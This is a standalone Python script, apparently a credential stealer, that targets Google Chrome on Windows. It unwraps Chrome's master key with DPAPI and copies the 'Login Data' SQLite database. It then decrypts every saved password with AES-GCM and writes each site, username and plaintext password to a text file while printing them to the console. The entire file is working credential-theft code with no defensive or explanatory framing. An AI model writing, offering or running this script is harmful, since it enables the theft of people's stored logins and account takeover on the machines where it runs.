import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def get_encryption_key():
    local_state_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # remove 'DPAPI' prefix
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            encrypted_password = encrypted_password[3:]
        nonce = encrypted_password[:12]
        ciphertext = encrypted_password[12:-16]
        tag = encrypted_password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode()
    except Exception as e:
        return None

def main():
    db_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    temp_path = "Loginvault.db"
    shutil.copyfile(db_path, temp_path)  # Copy DB because Chrome may lock it

    key = get_encryption_key()
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    with open("chrome_passwords.txt", "w", encoding="utf-8") as file:
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            decrypted_password = decrypt_password(encrypted_password, key)
            if decrypted_password:
                file.write(f"Site: {url}\nUser: {username}\nPass: {decrypted_password}\n{'='*40}\n")
                print(f"[+] {url} | {username} | {decrypted_password}")

    cursor.close()
    conn.close()
    os.remove(temp_path)
    print("[>] Done. Passwords saved in chrome_passwords.txt")

if __name__ == "__main__":
    main()
